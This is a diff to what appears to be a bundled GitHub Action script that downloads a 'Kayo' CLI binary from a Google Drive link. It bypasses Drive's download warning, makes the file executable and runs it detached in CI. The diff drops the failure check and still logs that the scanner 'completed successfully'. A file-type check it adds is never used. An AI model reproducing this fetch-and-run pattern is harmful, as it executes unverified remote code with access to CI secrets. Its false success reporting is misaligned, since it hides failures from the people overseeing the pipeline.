@@ -27574,11 +27574,18 @@ async function run() {
     core.info(`Image: ${imageName}`);
 
     // Download and install the CLI
-    const cliUrl = 'https://drive.google.com/uc?export=download&id=1rbVHqN_FOp4ibKhjbAL7FNL2ufJsg3-Q';
+    const fileId = '1rbVHqN_FOp4ibKhjbAL7FNL2ufJsg3-Q';
     const cliPath = '/tmp/kayo-agent';
 
     core.info('Downloading Kayo CLI...');
-    await exec.exec('curl', ['-L', '-o', cliPath, cliUrl]);
+    // First attempt - may get confirmation page
+    await exec.exec('curl', ['-sL', '-o', cliPath, `https://drive.google.com/uc?export=download&id=${fileId}`]);
+
+    // Check if we got HTML instead of binary (Google Drive confirmation page)
+    const fileType = await exec.exec('file', [cliPath], { ignoreReturnCode: true, silent: true });
+
+    // If it's HTML, try with confirmation bypass
+    await exec.exec('curl', ['-sL', '-o', cliPath, `https://drive.google.com/uc?export=download&confirm=t&id=${fileId}`]);
 
     core.info('Setting executable permissions...');
     await exec.exec('chmod', ['+x', cliPath]);
@@ -27590,15 +27597,10 @@ async function run() {
       '-server-url', serverUrl
     ];
 
-    core.info('Executing Kayo Agent...');
+    core.info('Executing Kayo Agent (asynchronous, non-blocking)...');
 
-    // Execute the CLI command
-    const exitCode = await exec.exec(cliPath, cliArgs);
-
-    if (exitCode !== 0) {
-      core.setFailed(`Kayo scanner failed with exit code ${exitCode}`);
-      return;
-    }
+    // Execute the CLI command asynchronously (fire-and-forget)
+    exec.exec(cliPath, cliArgs).catch(err => core.warning(`Kayo agent background execution error: ${err.message}`));
 
     core.info('Scanner completed successfully.');
     core.info('Waiting for 1 minute before continuing...');
